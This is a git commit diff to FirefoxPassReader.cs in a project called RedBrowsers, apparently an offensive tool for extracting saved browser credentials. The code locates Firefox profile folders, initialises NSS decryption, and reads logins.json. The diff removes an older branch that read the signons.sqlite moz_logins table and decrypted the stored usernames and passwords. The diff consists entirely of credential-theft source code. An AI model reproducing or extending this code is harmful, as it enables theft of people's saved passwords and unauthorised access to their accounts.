77a1e883c408d93aa5ddda9d2b13c39ddd050b2d
0xAshraf <82064460+0xAshraf@users.noreply.github.com>
2021-04-20 13:19:37 +0200

    j

--- RedBrowsers/Firefox/FirefoxPassReader.cs
+++ RedBrowsers/Firefox/FirefoxPassReader.cs
@@ -13,9 +13,8 @@ namespace RedBrowsers.Firfox
         public static string BrowserName { get { return "Firefox"; } }
         public static List<Account> ReadPasswords()
         {
-            string signonsFile = null;
+       
             string loginsFile = null;
-            bool signonsFound = false;
             bool loginsFound = false;
             string[] dirs = Directory.GetDirectories(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "Mozilla\\Firefox\\Profiles"));
 
@@ -25,67 +24,19 @@ namespace RedBrowsers.Firfox
 
             foreach (string dir in dirs)
             {
-                string[] files = Directory.GetFiles(dir, "signons.sqlite");
-                if (files.Length > 0)
-                {
-                    signonsFile = files[0];
-                    signonsFound = true;
-                }
-
-                // find &quot;logins.json"file
-                files = Directory.GetFiles(dir, "logins.json");
+                // find logins.json file
+                string[] files = Directory.GetFiles(dir, "logins.json");
                 if (files.Length > 0)
                 {
                     loginsFile = files[0];
                     loginsFound = true;
                 }
 
-                if (loginsFound || signonsFound)
+                if (loginsFound )
                 {
                     FFDecryptor.NSS_Init(dir);
                     break;
                 }
-
-            }
-
-            if (signonsFound)
-            {
-
-                SQLiteHandler SQLDatabase = new SQLiteHandler(signonsFile); //Open database with Sqlite
-
-                try
-                {
-                    SQLDatabase.ReadTable("moz_logins");
-                    for (int I = 0; I <= SQLDatabase.GetRowCount() - 1; I++)
-                    {
-                        try
-                        {
-                            //Get values with row number and column name
-                            string host = SQLDatabase.GetValue(I, "hostname");
-                            string username = FFDecryptor.Decrypt(SQLDatabase.GetValue(I, "encryptedUsername"));
-                            string password = FFDecryptor.Decrypt(SQLDatabase.GetValue(I, "encryptedPassword"));
-                            logins.Add(new Account
-                            {
-                                UserName = username,
-                                Password = password,
-                                URL = host,
-                                Application = BrowserName
-
-                            }); 
-                        }
-                        catch (Exception ex)
-                        {
-                            Console.WriteLine(ex.ToString());
-                        }
-                    }
-
-                }
-                catch (Exception ex)
-                {
-                    Console.WriteLine(ex.ToString());
-
-                }
-
             }
 
             if (loginsFound)
